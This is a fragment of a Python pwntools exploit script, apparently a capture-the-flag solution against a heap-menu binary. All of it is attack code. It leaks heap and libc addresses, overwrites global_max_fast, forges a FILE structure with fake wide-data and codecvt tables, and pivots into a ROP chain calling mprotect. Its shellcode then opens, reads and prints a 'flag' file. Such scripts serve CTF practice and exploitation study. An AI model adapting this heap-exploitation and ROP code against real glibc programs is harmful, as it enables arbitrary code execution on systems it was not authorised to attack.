  add(0x120,payload,0)
  delete(1)
  show(0)
  ru('\xe7\x90\xb4\x3a\x20')
  rv(0x100)
  heap_addr = u64(rv(8))
  top_addr = u64(rv(8))
  libc.address = top_addr - 1985696
  lg('heap_addr',heap_addr)
  lg('top_addr',top_addr)
  lg('libc',libc.address)
  malloc_hook = libc.symbols['__malloc_hook']
  lg('malloc_hook',malloc_hook)
  dl_open_hook = libc.symbols['_dl_open_hook']
  lg('dl_open_hook',dl_open_hook)
  global_max_fast = libc.address + 0x1e7600
  lg('global_max_fast',global_max_fast)
  IO_list_all = libc.symbols['_IO_list_all']
  lg('IO_list_all',IO_list_all)
  system = libc.symbols['system']
  lg('system',system)
  #lg('global_max_fast',global_max_fast)
  #delete(1)
  for i in range(7):
    add(0x3f0,p64(0x11)*(0x3f0/8),1)
    delete(1)

  payload = '\x00'*0x20 + p64(0) + p64(0xb1)
  payload += p64(heap_addr-0x620) + p64(global_max_fast-0x10)
  payload += (p64(0) + p64(0x21))*0x33
  add(0x370,payload,1)
  delete(0)
  #raw_input()
  
  add(0xa0,'a'*0xa0,0)
  delete(0)
  delete(1)
  payload = '\x00'*0x20 + p64(0) + p64(0x221)
  payload += p64(0)
  payload = payload.ljust(0x370,'\x00')
  add(0x370,payload,1)

  #raw_input()
  payload = p64(0x11)*(0x210/8)
  add(0x210,payload,0)
  delete(1)
  
  payload = '\x00'*0x20 + p64(0) + p64(0x1441)
  payload = payload.ljust(0x370,'\x00')
  add(0x370,payload,1)

  #raw_input()
  delete(0)
  delete(1)

  mprotect = libc.address + 0x117590
  pop_rdi = libc.address + 0x0000000000026542
  pop_rsi = libc.address + 0x0000000000026f9e
  pop_rdx = libc.address + 0x000000000012bda6
  rop_chain = p64(pop_rdi) + p64(heap_addr&0xfffffffffffff000)
  rop_chain += p64(pop_rsi) + p64(0x2000)
  rop_chain += p64(pop_rdx) + p64(7)
  rop_chain += p64(mprotect)

  shellcode = shellcraft.amd64.pushstr('flag')
  shellcode += '''
    mov rdi,rsp
    xor rsi,rsi
    mov rax,2
    syscall
  '''
  shellcode += shellcraft.amd64.linux.read(3,'rdi',0x100)
  shellcode += shellcraft.amd64.linux.write(1,'rsp',0x100)
  

  magic_addr = libc.address + 0x000000000014BC60
  leave_ppp_ret = libc.address + 0xed5dc
  io_file_sync = libc.address + 0x1E6440 - 0x18
  fake_wide_data = p64(0)*3 + p64(0) + p64(4) + p64(0)*6
  fake_codecvt = p64(leave_ppp_ret) + p64(magic_addr)
  payload = '\x00'*0x20
  payload += p64(0x00000000fbad8000) + p64(0)*3 + p64(0) + p64(1) + p64(0)
  payload += '\x00'*0x38 + p64(1)
  payload = payload.ljust(0xb8,'\x00')
  payload += p64(heap_addr + 0x138) 
  payload += p64(heap_addr + 0xe0)
  payload += p64(0)*3
  payload += p64(1)
  payload = payload.ljust(0xf8,'\x00')
  payload +=  p64(io_file_sync)
  payload += fake_wide_data
  payload += fake_codecvt
  payload += p64(heap_addr + 0x80)
  payload += p64(heap_addr + 0x100)
  payload += rop_chain
  payload += p64(heap_addr + 0x198)
  payload += asm(shellcode)
  #0x00000000000ed5dc
  payload = payload.ljust(0x370,'\x00')
  add(0x370,payload,0)
  
  #raw_input()
  #0000000000088F60
  sla(': ','6')
  p.interactive()
hack()

```

